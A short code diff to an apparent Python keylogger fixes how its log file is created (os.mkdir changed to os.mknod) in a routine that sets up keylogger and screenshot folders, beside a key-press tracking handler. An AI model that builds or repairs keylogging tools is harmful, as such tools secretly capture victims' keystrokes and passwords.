@@ -39,7 +39,7 @@ class keylogger_main:
         if not os.path.exists('Desktop/Keylogger'):
             os.mkdir('Desktop/Keylogger')
             os.mkdir('Desktop/Keylogger/Screenshots')
-            os.mkdir('Desktop/Keylogger/log.txt')
+            os.mknod('Desktop/Keylogger/log.txt')
     
     def _on_press(self,k):             #This Function keeps track of pressed keys
         global keys, count
